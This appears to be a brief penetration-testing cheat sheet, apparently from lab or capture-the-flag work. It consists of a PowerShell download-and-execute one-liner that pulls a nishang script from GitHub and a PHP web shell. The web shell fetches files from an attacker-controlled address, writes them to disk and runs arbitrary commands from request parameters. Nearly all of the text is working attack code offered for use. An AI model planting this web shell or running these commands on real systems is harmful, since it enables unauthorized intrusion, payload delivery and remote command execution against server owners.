# Powershell commands

Download file:
IEX((New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Download.ps1', 'download.ps1'))

# PHP Shell
```php
$phpCode = <<<'EOD'
<?php
	if (isset($_REQUEST['fupload'])) {
		file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.6:8090/" . $_REQUEST['fupload']));
	};
	if (isset($_REQUEST['fexec'])) {
		echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
	};
?>
EOD;
```
